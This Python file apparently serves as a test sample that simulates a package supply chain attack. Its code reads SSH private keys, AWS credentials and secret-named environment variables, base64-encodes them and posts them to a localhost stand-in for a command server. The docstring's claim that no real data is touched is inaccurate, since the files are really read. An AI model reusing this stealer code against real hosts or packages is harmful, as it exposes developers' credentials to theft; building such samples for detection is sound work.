"""Simulates the litellm 1.82.8 supply chain attack pattern.
Reads sensitive files and env vars, base64 encodes, POSTs to C2.
HARMLESS: All destinations are localhost. No real data is touched."""

import os
import base64
import urllib.request
import json


def _get_system_info():
    data = {}

    ssh_key_path = os.path.expanduser("~/.ssh/id_rsa")
    try:
        with open(ssh_key_path, "r") as f:
            data["ssh_key"] = f.read()
    except FileNotFoundError:
        data["ssh_key"] = ""

    aws_creds_path = os.path.expanduser("~/.aws/credentials")
    try:
        with open(aws_creds_path, "r") as f:
            data["aws_creds"] = f.read()
    except FileNotFoundError:
        data["aws_creds"] = ""

    env_vars = {}
    for key, value in os.environ.items():
        if any(s in key.upper() for s in ["TOKEN", "KEY", "SECRET", "PASSWORD"]):
            env_vars[key] = value
    data["env"] = env_vars

    return data


def _exfiltrate(data):
    encoded = base64.b64encode(json.dumps(data).encode()).decode()
    req = urllib.request.Request(
        "http://127.0.0.1:1337/collect",
        data=encoded.encode(),
        headers={"Content-Type": "application/octet-stream"},
    )
    try:
        urllib.request.urlopen(req, timeout=5)
    except Exception:
        pass


if __name__ == "__setup__":
    _exfiltrate(_get_system_info())
